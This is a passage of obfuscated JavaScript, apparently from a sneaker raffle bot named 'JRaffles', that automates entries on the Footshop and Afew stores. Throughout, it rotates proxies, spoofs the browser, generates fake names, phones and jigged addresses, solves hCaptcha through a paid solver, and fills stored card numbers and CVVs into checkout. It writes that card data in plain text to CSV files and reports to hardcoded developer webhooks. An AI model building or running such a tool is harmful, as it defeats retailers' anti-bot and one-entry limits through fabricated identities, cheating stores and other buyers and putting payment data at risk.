                                    'name': 'Store',
                                    'value': '' + _0x26c577['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0xc43b8d['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x44c289,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x114c8d['data'];
                            } else {
                                if (_0x46f2c4 && _0x2a586d == 'ver') {
                                    var _0x114c8d = new _0x19d385()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x26c577['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x57b088,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x425e10,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x26c577['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0xc43b8d['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x44c289,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x114c8d['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x3cdb09(_0x103308, _0x15eb87) {
    var _0x44deb4 = _0x103308[_0x15eb87]['Address1']['split'](''), _0x5de8f1 = _0x103308[_0x15eb87]['Address2']['split'](''), _0x56d9c4 = _0x103308[_0x15eb87]['Email']['split']('@');
    for (var _0xb800c0 = 0x0; _0xb800c0 < _0x44deb4['length']; _0xb800c0++) {
        if (_0x44deb4[_0xb800c0] == 'X') {
            var _0x44c46f = Math['round'](Math['random']() * (_0x2dd2d8['length'] - 0x1));
            _0x44deb4[_0xb800c0] = _0x3edefc[_0x44c46f];
        }
    }
    ;
    for (var _0xb800c0 = 0x0; _0xb800c0 < _0x5de8f1['length']; _0xb800c0++) {
        if (_0x5de8f1[_0xb800c0] == 'X') {
            var _0x44c46f = Math['round'](Math['random']() * (_0x2dd2d8['length'] - 0x1));
            _0x5de8f1[_0xb800c0] = _0x3edefc[_0x44c46f];
        }
    }
    ;
    _0x103308[_0x15eb87]['FirstName'] == 'RANDOM' && (_0x103308[_0x15eb87]['FirstName'] = _0x2f090a['first']());
    _0x103308[_0x15eb87]['LastName'] == 'RANDOM' && (_0x103308[_0x15eb87]['LastName'] = _0x2f090a['last']());
    _0x56d9c4[0x0] == 'RANDOM' ? _0x56d9c4[0x0] = '' + _0x2f090a['first']() + _0x2f090a['last']() + '@' : _0x56d9c4[0x0] = _0x56d9c4[0x0] + '@';
    _0x103308[_0x15eb87]['Email'] = _0x56d9c4['join'](''), _0x103308[_0x15eb87]['Address1'] = _0x44deb4['join'](''), _0x103308[_0x15eb87]['Address2'] = _0x5de8f1['join']('');
    _0x103308[_0x15eb87]['Phone'] == 'RANDOM' && (_0x103308[_0x15eb87]['Phone'] = '0' + _0x51cb94(0x5f5e100, 0x3b9ac9ff));
    if (_0x103308[_0x15eb87]['Follower'] == 'RANDOM') {
        var _0x11db30 = _0x51cb94(0x1, 0x270f);
        _0x103308[_0x15eb87]['Follower'] = '' + _0x2f090a['first']() + _0x2f090a['last']() + _0x11db30 + '\x20';
    }
    _0x103308[_0x15eb87]['HouseNumber'] == 'RANDOM' && (_0x103308[_0x15eb87]['HouseNumber'] = _0x51cb94(0x1, 0xc8));
    if (_0x103308[_0x15eb87]['Address1'] == 'RANDOM') {
        var _0x4d5fd4 = Math['round'](Math['random']() * (_0x2dd2d8['length'] - 0x1)), _0x5b22da = _0x3edefc[_0x4d5fd4];
        _0x103308[_0x15eb87]['Address1'] = _0x2f090a['last']() + 'straat', _0x103308[_0x15eb87]['Zip'] == '' && (_0x103308[_0x15eb87]['Postcode'] = _0x51cb94(0x3e8, 0x270f) + '\x20' + _0x5b22da + _0x5b22da, _0x103308[_0x15eb87]['Zip'] = _0x103308[_0x15eb87]['Postcode']), _0x103308[_0x15eb87]['HouseNumber'] = '' + _0x51cb94(0x1, 0xc8);
    }
    return;
}
;
async function _0x254c07(_0x1a62f9, _0x572aea) {
    _0x16016b['appendFileSync']('../failed-tasks.csv', _0xe3afb4() + ',' + _0x572aea['store'] + ',' + _0x572aea['name'] + ',' + _0x1a62f9['Url'] + ',' + _0x1a62f9['Size'] + ',' + _0x1a62f9['Follower'] + ',' + _0x1a62f9['FirstName'] + ',' + _0x1a62f9['LastName'] + ',' + _0x1a62f9['Address1'] + ',' + _0x1a62f9['Address2'] + ',' + _0x1a62f9['HouseNumber'] + ',' + _0x1a62f9['Zip'] + ',' + _0x1a62f9['City'] + ',' + _0x1a62f9['State'] + ',' + _0x1a62f9['Country'] + ',' + _0x1a62f9['Phone'] + ',' + _0x1a62f9['Email'] + ',' + _0x1a62f9['Password'] + ',' + _0x1a62f9['PaymentMethod'] + ',' + _0x1a62f9['CardType'] + ',' + _0x1a62f9['NameOnCard'] + ',' + _0x1a62f9['CardNumber'] + ',' + _0x1a62f9['ExpiryDate'] + ',' + _0x1a62f9['CVV'] + ',' + _0x1a62f9['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x1dc885(_0x563423, _0x407d5d) {
    _0x16016b['appendFileSync']('../successful-tasks.csv', _0xe3afb4() + ',' + _0x407d5d['store'] + ',' + _0x407d5d['name'] + ',' + _0x563423['Url'] + ',' + _0x563423['Size'] + ',' + _0x563423['Follower'] + ',' + _0x563423['FirstName'] + ',' + _0x563423['LastName'] + ',' + _0x563423['Address1'] + ',' + _0x563423['Address2'] + ',' + _0x563423['HouseNumber'] + ',' + _0x563423['Zip'] + ',' + _0x563423['City'] + ',' + _0x563423['State'] + ',' + _0x563423['Country'] + ',' + _0x563423['Phone'] + ',' + _0x563423['Email'] + ',' + _0x563423['Password'] + ',' + _0x563423['PaymentMethod'] + ',' + _0x563423['CardType'] + ',' + _0x563423['NameOnCard'] + ',' + _0x563423['CardNumber'] + ',' + _0x563423['ExpiryDate'] + ',' + _0x563423['CVV'] + ',' + _0x563423['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x663aab() {
    let _0x2e7df0 = proxyFile['split']('\x0a'), _0x36a9b4 = _0x2e7df0['map']((_0x5e1357, _0x44880e) => {
        sanatizeProxy = _0x5e1357['replace']('\x0d', '');
        if (_0x2e7df0[_0x44880e + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x36a9b4;
}
;
async function _0x2891b8(_0x16a1bd) {
    var _0x2037a3 = _0x16a1bd[0x1]['split'](':');
    const _0x43c82c = await _0x114f6['launch']({
        'headless': !![],
        'args': ['--proxy-server=' + _0x2037a3[0x0] + ':' + _0x2037a3[0x1] + ',--no-sandbox\x27,\x0a\x20\x20\x20\x20\x20\x20\x27--disable-setuid-sandbox,--force-device-scale-factor=0.3']
    });
    try {
        const _0x2380fe = await _0x43c82c['newPage']();
        await _0x2380fe['authenticate']({
            'username': '' + _0x2037a3[0x2],
            'password': '' + _0x2037a3[0x3]
        }), console['log'](_0x561248() + '\x20[' + _0x5c60fc[taskModule]['name'] + ']\x20Afew\x20Scraper\x20started'), await _0x2380fe['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x2380fe['setRequestInterception'](!![]), _0x2380fe['on']('request', _0x45763c => {
            _0x45763c['resourceType']() === 'image' || _0x45763c['resourceType']() === 'font' || _0x45763c['resourceType']() === 'media' ? _0x45763c['abort']() : _0x45763c['continue']();
        }), await _0x2380fe['goto']('https://en.afew-store.com/collections/sneaker-raffles'), console['log'](_0x561248() + '\x20[' + _0x5c60fc[taskModule]['name'] + ']\x20Looking\x20for\x20Raffles'), await _0x2380fe['waitForTimeout'](0xbb8), await _0x2380fe['waitForSelector']('.product-card');
        const _0x3e49b4 = await _0x2380fe['$$eval']('a.product-card', _0x3ab82f => {
            return _0x3ab82f['map'](_0x1dcbf5 => _0x1dcbf5['href']);
        });
        return _0x33efec = _0x3e49b4;
    } catch (_0x3c1198) {
        console['log']('\x20' + _0x3c1198);
    } finally {
        _0x43c82c['close'](), console['clear']();
    }
}
;
async function _0x51116d(_0x2e5d14, _0x4e9ddf, _0x198447, _0xb025c6, _0x31e49e) {
    _0x4e9ddf != 'ver' && await _0x3cdb09(_0xb025c6, _0x2e5d14);
    if (_0xc43b8d['useRandomProxy'] = ![])
        var _0x55c80a = _0x31e49e[_0x2e5d14]['split'](':');
    else
        var _0x3a1012 = Math['round'](Math['random']() * (_0x31e49e['length'] - 0x1)), _0x55c80a = _0x31e49e[_0x3a1012]['split'](':');
    var _0x3eb5b7 = _0x198447['data'];
    _0x4e9ddf != 'ver' && (_0x3eb5b7['data']['attributes']['properties']['$first_name'] = '' + _0xb025c6[_0x2e5d14]['FirstName'], _0x3eb5b7['data']['attributes']['properties']['$last_name'] = '' + _0xb025c6[_0x2e5d14]['LastName'], _0x3eb5b7['data']['attributes']['properties']['$address1'] = _0xb025c6[_0x2e5d14]['Address1'] + '\x20' + _0xb025c6[_0x2e5d14]['HouseNumber'] + '\x20' + _0xb025c6[_0x2e5d14]['Address2'], _0x3eb5b7['data']['attributes']['properties']['$zip'] = '' + _0xb025c6[_0x2e5d14]['Zip'], _0x3eb5b7['data']['attributes']['properties']['$city'] = '' + _0xb025c6[_0x2e5d14]['City'], _0x3eb5b7['data']['attributes']['properties']['$country'] = '' + _0xb025c6[_0x2e5d14]['Country'], _0x3eb5b7['data']['attributes']['properties']['Size'] = '' + _0xb025c6[_0x2e5d14]['Size'], _0x3eb5b7['data']['attributes']['properties']['Instagram\x20Handle'] = '' + _0xb025c6[_0x2e5d14]['Follower'], _0x4e9ddf == 'exp' ? _0x3eb5b7['data']['attributes']['email'] = '' + _0xb025c6[_0x2e5d14]['FirstName'] + _0xb025c6[_0x2e5d14]['LastName'] + _0xc43b8d['catchall'] : _0x3eb5b7['data']['attributes']['email'] = '' + _0xb025c6[_0x2e5d14]['Email']);
    var _0x4bff85 = {
        'jar': _0x225238,
        'followAllRedirects': !![],
        'method': 'POST',
        'url': _0x198447['url'],
        'headers': _0x198447['headers'],
        'body': JSON['stringify'](_0x3eb5b7),
        'proxy': 'http://' + _0x55c80a[0x2] + ':' + _0x55c80a[0x3] + '@' + _0x55c80a[0x0] + ':' + _0x55c80a[0x1]
    };
    return _0x4e9ddf === 'ver' && (_0x4bff85['method'] = 'GET'), new Promise(function (_0x4e36f1, _0xc802da) {
        callback = async (_0x534ad7, _0x3ec8f7, _0x550340) => {
            if (!_0x534ad7 && _0x3ec8f7['statusCode'] == 0xca || !_0x534ad7 && _0x3ec8f7['statusCode'] == 0xc8) {
                _0x1dc885(_0xb025c6[_0x2e5d14], _0x198447), _0x4e36f1(console['log'](_0x3e492c['green'](_0x561248() + '\x20[' + _0x198447['name'] + ']\x20Task\x20' + (_0x2e5d14 + 0x1) + ':\x20Raffle\x20Entered!')));
                if (_0x4e9ddf != 'ver') {
                    var _0x209551 = await _0x555e75(_0xb025c6[_0x2e5d14], _0x198447, 'dev', ![]), _0x322e69 = await _0x555e75(_0xb025c6[_0x2e5d14], _0x198447, 'pub', ![]);
                    const _0x32b6c4 = {
                        'succesDEVMSG': { 'embeds': [_0x209551] },
                        'succesPUBMSG': { 'embeds': [_0x322e69] }
                    };
                    if (_0xc43b8d['webhook'] != undefined && _0xc43b8d['webhook'] != '')
                        try {
                            await _0x57e113(_0xc43b8d['webhook'], _0x32b6c4['succesDEVMSG']);
                        } catch {
                        }
                    await _0x1b3ea1(0xc8), await _0x57e113(_0x344e4d, _0x32b6c4['succesDEVMSG']), await _0x1b3ea1(0xc8);
                    try {
                        await _0x57e113(_0x45d3b5, _0x32b6c4['succesPUBMSG']);
                    } catch {
                    }
                } else {
                    if (_0x4e9ddf == 'ver') {
                        var _0x209551 = await _0x555e75(null, _0x198447, 'ver', ![]);
                        const _0x967f7a = {
                            'succesDEVMSG': { 'embeds': [_0x209551] },
                            'succesPUBMSG': { 'embeds': [_0x322e69] }
                        };
                        await _0x57e113(_0x4cf4a8, _0x967f7a['succesDEVMSG']);
                    }
                }
            } else {
                if (_0x4e9ddf != 'ver') {
                    var _0x12bbcb = '' + _0x534ad7, _0x158119 = await _0x555e75(_0xb025c6[_0x2e5d14], _0x198447, 'dev', !![], _0x12bbcb), _0x3fffda = {};
                    _0x3fffda['errorDEV'] = { 'embeds': [_0x158119] }, _0x254c07(_0xb025c6[_0x2e5d14], _0x198447), _0xc43b8d['webhook'] != undefined && _0xc43b8d['webhook'] != '' && await _0x57e113(_0xc43b8d['webhook'], _0x3fffda['errorDEV']), await _0x57e113(_0x570583, _0x3fffda['errorDEV']);
                }
                _0xc802da(console['log'](_0x561248() + '\x20[' + _0x198447['name'] + ']\x20Task\x20' + (_0x2e5d14 + 0x1) + ':\x20' + _0x534ad7));
            }
        };
        try {
            _0x4e9ddf === 'ver' ? console['log'](_0x561248() + '\x20[' + _0x198447['name'] + ']\x20Task\x20' + (_0x2e5d14 + 0x1) + ':\x20Verifying.') : console['log'](_0x561248() + '\x20[' + _0x198447['name'] + ']\x20Task\x20' + (_0x2e5d14 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x3eb5b7['data']['attributes']['email']), _0x511317(_0x4bff85, callback);
        } catch (_0x3177e7) {
            console['log'](_0x561248() + '\x20Task\x20' + (_0x2e5d14 + 0x1) + ':\x20' + _0x3177e7);
        }
    });
}
;
async function _0x1e4d9b(_0x26304f, _0x2db126, _0x1f96ec) {
    _0x114f6['use'](_0x51de99()), _0x114f6['use'](_0x3b1867({
        'provider': {
            'id': '2captcha',
            'token': '' + _0xc43b8d['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0xc2b666 = 0x0; _0xc2b666 < _0x26304f['length']; _0xc2b666++) {
        var _0x33e512;
        if (_0x810278 != 'yes')
            var _0x810278 = '', _0x145d51 = 0x0;
        var _0x4877a6 = [{
            'type': 'rich',
            'title': 'Succesful\x20Footshop\x20entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x57b088
                },
                {
                    'name': 'Product',
                    'value': '' + _0x26304f[_0xc2b666]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x26304f[_0xc2b666]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0xc43b8d['footshopDelay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x44c289
                }
            ]
        }], _0x378c82 = await _0x555e75(_0x26304f[_0xc2b666], _0x1f96ec, 'dev', ![]), _0x23f13c = await _0x555e75(_0x26304f[_0xc2b666], _0x1f96ec, 'pub', ![]);
        const _0x2b7db1 = {
            'succesDEVMSG': { 'embeds': [_0x378c82] },
            'succesPUBMSG': { 'embeds': [_0x23f13c] }
        }, _0x159492 = { 'embeds': _0x4877a6 };
        await _0x3cdb09(_0x26304f, _0xc2b666);
        if (_0x26304f[_0xc2b666]['Email'] == '' || _0x26304f[_0xc2b666]['FirstName'] == '' || _0x26304f[_0xc2b666]['LastName'] == '' || _0x26304f[_0xc2b666]['Country'] == '' || _0x26304f[_0xc2b666]['Size'] == '' || _0x26304f[_0xc2b666]['Address1'] == '' || _0x26304f[_0xc2b666]['Zip'] == '') {
            console['log'](_0x561248() + '\x20[' + _0x1f96ec['name'] + ']\x20Task\x20' + (_0xc2b666 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x26304f[_0xc2b666]['Email'] == '' || _0x26304f[_0xc2b666]['FirstName'] == '' || _0x26304f[_0xc2b666]['LastName'] == '' || _0x26304f[_0xc2b666]['Country'] == '' || _0x26304f[_0xc2b666]['Size'] == '' || _0x26304f[_0xc2b666]['Address1'] == '' || _0x26304f[_0xc2b666]['Zip'] == '' || _0x26304f[_0xc2b666]['Phone'] == '') {
            console['log'](_0x561248() + '\x20[' + _0x1f96ec['name'] + ']\x20Task\x20' + (_0xc2b666 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        const _0x34c29d = '' + _0x26304f[_0xc2b666]['Url'];
        if (_0xc43b8d['useRandomProxy'] = ![])
            var _0x5b1e4d = _0x2db126[_0xc2b666]['split'](':');
        else
            var _0x4bfbaf = Math['round'](Math['random']() * (_0x2db126['length'] - 0x1)), _0x5b1e4d = _0x2db126[_0x4bfbaf]['split'](':');
        const _0x12848c = await _0x114f6['launch']({
            'headless': !![],
            'args': ['--proxy-server=' + _0x5b1e4d[0x0] + ':' + _0x5b1e4d[0x1]]
        });
        try {
            const _0x254a2b = await _0x12848c['newPage']();
            await _0x254a2b['authenticate']({
                'username': '' + _0x5b1e4d[0x2],
                'password': '' + _0x5b1e4d[0x3]
            }), console['log'](_0x561248() + '\x20[' + _0x1f96ec['name'] + ']\x20Task\x20' + (_0xc2b666 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x254a2b['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x254a2b['setRequestInterception'](!![]), _0x254a2b['on']('request', _0x55516c => {
                _0x55516c['resourceType']() === 'image' || _0x55516c['resourceType']() === 'font' || _0x55516c['resourceType']() === 'media' ? _0x55516c['abort']() : _0x55516c['continue']();
            }), await _0x254a2b['goto'](_0x34c29d), await _0x1b3ea1(0xbb8), await _0x254a2b['waitForSelector']('.control__JhutY'), await _0x254a2b['click']('.control__JhutY'), await _0x1b3ea1(0x1f4);
            if (_0x26304f[_0xc2b666]['Size'] != 'RANDOM')
                try {
                    const _0x622903 = await _0x254a2b['$x']('//div[contains(text(),\x20\x27' + _0x26304f[_0xc2b666]['Size'] + '\x27)]');
                    await _0x622903[0x0]['click']();
                } catch {
                    console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0x1f96ec['name'] + ']\x20Task\x20' + (_0xc2b666 + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                    continue;
                }
            else {
                const _0x44bcbb = await _0x254a2b['$$']('.options__3UQpT\x20>\x20div.row');
                var _0x6dc73d = Math['round'](Math['random']() * (_0x44bcbb['length'] - 0x1));
                await _0x44bcbb[_0x6dc73d]['click']();
            }
            await _0x1b3ea1(0x4b0);
            const _0x511a56 = await _0x254a2b['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
            await _0x511a56[0x0]['click'](), await _0x254a2b['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x561248() + '\x20[' + _0x1f96ec['name'] + ']\x20Task\x20' + (_0xc2b666 + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x254a2b['type']('input[name=\x22email\x22]', '' + _0x26304f[_0xc2b666]['Email']), await _0x1b3ea1(0x640), await _0x254a2b['type']('input[name=\x22phone\x22]', '' + _0x26304f[_0xc2b666]['Phone']), await _0x1b3ea1(0x4b0), await _0x254a2b['click']('button.btn.continue-button__1RtsS'), await _0x1b3ea1(0x4b0);
            try {
                await _0x254a2b['type']('input[name=\x22firstName\x22]', '' + _0x26304f[_0xc2b666]['FirstName']), await _0x1b3ea1(0x258);
            } catch {
                const _0x597ad9 = await _0x254a2b['$$eval']('.invalid-feedback\x20>\x20div', _0x2a3b62 => {
                    return _0x2a3b62['map'](_0x2ea432 => _0x2ea432['innerText']);
                });
                console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0x1f96ec['name'] + ']\x20Task\x20' + (_0xc2b666 + 0x1) + '\x20:\x20' + _0x597ad9));
                continue;
            }
            await _0x254a2b['type']('input[name=\x22lastName\x22]', '' + _0x26304f[_0xc2b666]['LastName']), await _0x1b3ea1(0xc8), await _0x254a2b['type']('input[name=\x22instagramUsername\x22]', '' + _0x26304f[_0xc2b666]['Follower']), await _0x1b3ea1(0x4b0), await _0x254a2b['click']('button.btn.continue-button__1RtsS'), await _0x1b3ea1(0x3e8), console['log'](_0x561248() + '\x20[' + _0x1f96ec['name'] + ']\x20Task\x20' + (_0xc2b666 + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x254a2b['select']('select[name=\x22country\x22]', '' + _0x26304f[_0xc2b666]['Country']), await _0x1b3ea1(0x2bc), await _0x254a2b['type']('input[name=\x22streetName\x22]', '' + _0x26304f[_0xc2b666]['Address1']), await _0x1b3ea1(0x258), await _0x254a2b['type']('input[name=\x22houseNumber\x22]', _0x26304f[_0xc2b666]['HouseNumber'] + '\x20' + _0x26304f[_0xc2b666]['Address2']), await _0x1b3ea1(0xc8), await _0x254a2b['type']('input[name=\x22postalCode\x22]', '' + _0x26304f[_0xc2b666]['Zip']), await _0x1b3ea1(0x1f4), await _0x254a2b['type']('input[name=\x22city\x22]', '' + _0x26304f[_0xc2b666]['City']), await _0x1b3ea1(0x4b0), await _0x254a2b['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x1b3ea1(0x4b0), await _0x254a2b['click']('button.btn.continue-button__1RtsS'), await _0x1b3ea1(0x4b0), console['log'](_0x561248() + '\x20[' + _0x1f96ec['name'] + ']\x20Task\x20' + (_0xc2b666 + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x254a2b['solveRecaptchas'](), console['log'](_0x561248() + '\x20[' + _0x1f96ec['name'] + ']\x20Task\x20' + (_0xc2b666 + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x1b3ea1(0xbb8), await _0x254a2b['click']('button.btn.continue-button__1RtsS'), await _0x1b3ea1(0x1388), console['log'](_0x561248() + '\x20[' + _0x1f96ec['name'] + ']\x20Task\x20' + (_0xc2b666 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x254a2b['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x254a2b['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x1b3ea1(0x4b0), await _0x254a2b['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x26304f[_0xc2b666]['CardNumber']), await _0x1b3ea1(0x320), await _0x254a2b['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x254a2b['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x26304f[_0xc2b666]['ExpiryDate']), await _0x1b3ea1(0x4b0), await _0x254a2b['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x254a2b['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x26304f[_0xc2b666]['CVV']), await _0x1b3ea1(0x226), await _0x254a2b['type']('input[name=\x22holderName\x22]', '' + _0x26304f[_0xc2b666]['NameOnCard']), await _0x1b3ea1(0x226), await _0x254a2b['click']('button.adyen-checkout__button'), console['log'](_0x561248() + '\x20[' + _0x1f96ec['name'] + ']\x20Task\x20' + (_0xc2b666 + 0x1) + '\x20:\x20Awaiting\x203DS');
            try {
                await _0x254a2b['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x1b3ea1(0xbb8);
            } catch (_0x59ca40) {
                console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0x1f96ec['name'] + ']\x20Task\x20' + (_0xc2b666 + 0x1) + '\x20:\x203DS\x20Failed')), _0x33e512 = '3DS\x20Error\x20' + _0x59ca40;
                var _0x515b77 = await _0x555e75(_0x26304f[_0xc2b666], _0x1f96ec, 'dev', !![], _0x33e512);
                _0x2b7db1['errorDEV'] = { 'embeds': [_0x515b77] };
                _0xc43b8d['webhook'] != undefined && _0xc43b8d['webhook'] != '' && await _0x57e113(_0xc43b8d['webhook'], _0x2b7db1['errorDEV']);
                await _0x57e113(_0x570583, _0x2b7db1['errorDEV']);
                continue;
            }
            _0x1dc885(_0x26304f[_0xc2b666], _0x1f96ec), console['log'](_0x3e492c['green'](_0x561248() + '\x20[' + _0x1f96ec['name'] + ']\x20Task\x20' + (_0xc2b666 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            if (_0xc43b8d['webhook'] != undefined && _0xc43b8d['webhook'] != '')
                try {
                    await _0x57e113(_0xc43b8d['webhook'], _0x2b7db1['succesDEVMSG']);
                } catch {
                }
            await _0x1b3ea1(0xc8), await _0x57e113(_0x344e4d, _0x2b7db1['succesDEVMSG']), await _0x1b3ea1(0xc8);
            try {
                await _0x57e113(_0x45d3b5, _0x2b7db1['succesPUBMSG']);
            } catch {
            }
        } catch (_0x78d3a0) {
            console['log'](_0x561248() + '\x20[' + _0x1f96ec['name'] + ']\x20Task\x20' + (_0xc2b666 + 0x1) + '\x20:\x20' + _0x78d3a0), _0x33e512 = '' + _0x78d3a0;
            var _0x515b77 = await _0x555e75(_0x26304f[_0xc2b666], _0x1f96ec, 'dev', !![], _0x33e512);
            _0x2b7db1['errorDEV'] = { 'embeds': [_0x515b77] }, _0xc43b8d['webhook'] != undefined && _0xc43b8d['webhook'] != '' && await _0x57e113(_0xc43b8d['webhook'], _0x2b7db1['errorDEV']), await _0x57e113(_0x570583, _0x2b7db1['errorDEV']), _0x810278 = 'yes';
        } finally {
            _0x12848c['close']();
            if (_0x810278 == 'yes' && _0x145d51 != 0x5) {
                console['log'](_0x3e492c['red'](_0x561248() + '\x20[' + _0x1f96ec['name'] + ']\x20Task\x20' + (_0xc2b666 + 0x1) + '\x20:\x20Retrying')), _0xc2b666 = _0xc2b666 - 0x1, _0x145d51 = _0x145d51 + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0xc43b8d['footshopDelay'] + '\x20ms'), await _0x1b3ea1(_0xc43b8d['footshopDelay']);
        }
    }
}
afewFunction = async (_0x5c9dbb, _0x5ac109, _0xa05eae, _0x1cb26e, _0x4cc239) => {
    for (var _0x2579d3 = 0x0; _0x2579d3 < _0x1cb26e['length']; _0x2579d3++) {
        _0xc43b8d['AfewDelay'] = _0xc43b8d['delay'];
        var _0x1339d5;
        if (_0x300212 != 'yes')
            var _0x300212 = '', _0x46ae9d = 0x0;
        _0x1cb26e[_0x2579d3]['Url'] = _0x5c9dbb, _0x2768f8(_0xa05eae['name'] + '\x20Task\x20' + (_0x2579d3 + 0x1) + '\x20/\x20' + _0x1cb26e['length'] + '\x20||\x20File:\x20' + _0x2de798 + '\x20Proxies:\x20' + _0x327247), await _0x3cdb09(_0x1cb26e, _0x2579d3);
        var _0x147653 = await _0x555e75(_0x1cb26e[_0x2579d3], _0xa05eae, 'dev', ![]), _0x142f7e = await _0x555e75(_0x1cb26e[_0x2579d3], _0xa05eae, 'pub', ![]);
        const _0x492f77 = {
            'succesDEVMSG': { 'embeds': [_0x147653] },
            'succesPUBMSG': { 'embeds': [_0x142f7e] }
        };
        if (_0x1cb26e[_0x2579d3]['Email'] == '' || _0x1cb26e[_0x2579d3]['FirstName'] == '' || _0x1cb26e[_0x2579d3]['LastName'] == '' || _0x1cb26e[_0x2579d3]['Country'] == '' || _0x1cb26e[_0x2579d3]['Size'] == '' || _0x1cb26e[_0x2579d3]['Address1'] == '' || _0x1cb26e[_0x2579d3]['Zip'] == '') {
            console['log'](_0x561248() + '\x20[' + _0xa05eae['name'] + ']\x20Task\x20' + (_0x2579d3 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0xc43b8d['useRandomProxy'] = ![])
            var _0x32bf24 = _0x4cc239[_0x2579d3]['split'](':');
        else
            var _0x361daf = Math['round'](Math['random']() * (_0x4cc239['length'] - 0x1)), _0x32bf24 = _0x4cc239[_0x361daf]['split'](':');
        const _0x137619 = await _0x114f6['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x32bf24[0x0] + ':' + _0x32bf24[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x491972 = await _0x137619['newPage']();
            await _0x491972['setDefaultNavigationTimeout'](0x1d4c0), await _0x491972['authenticate']({
                'username': '' + _0x32bf24[0x2],
                'password': '' + _0x32bf24[0x3]
            }), console['log'](_0x561248() + '\x20[' + _0xa05eae['name'] + ']\x20Task\x20' + (_0x2579d3 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x491972['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x491972['setRequestInterception'](!![]), _0x491972['on']('request', _0x524bd8 => {
                _0x524bd8['resourceType']() === 'image' || _0x524bd8['resourceType']() === 'font' || _0x524bd8['resourceType']() === 'media' ? _0x524bd8['abort']() : _0x524bd8['continue']();
            }), await _0x491972['goto'](_0x5c9dbb, { 'waitUntil': 'networkidle2' }), console['log'](_0x561248() + '\x20[' + _0xa05eae['name'] + ']\x20Task\x20' + (_0x2579d3 + 0x1) + '\x20:\x20Gathering\x20cookies'), await _0x491972['waitForTimeout'](0xfa0), console['log'](_0x561248() + '\x20[' + _0xa05eae['name'] + ']\x20Task\x20' + (_0x2579d3 + 0x1) + '\x20:\x20Cookies\x20received'), await _0x491972['waitForTimeout'](0x320);
            if (_0x1cb26e[_0x2579d3]['Size'] == 'RANDOM') {
                console['log'](_0x561248() + '\x20[' + _0xa05eae['name'] + ']\x20Task\x20' + (_0x2579d3 + 0x1) + '\x20:\x20Choosing\x20random\x20size');
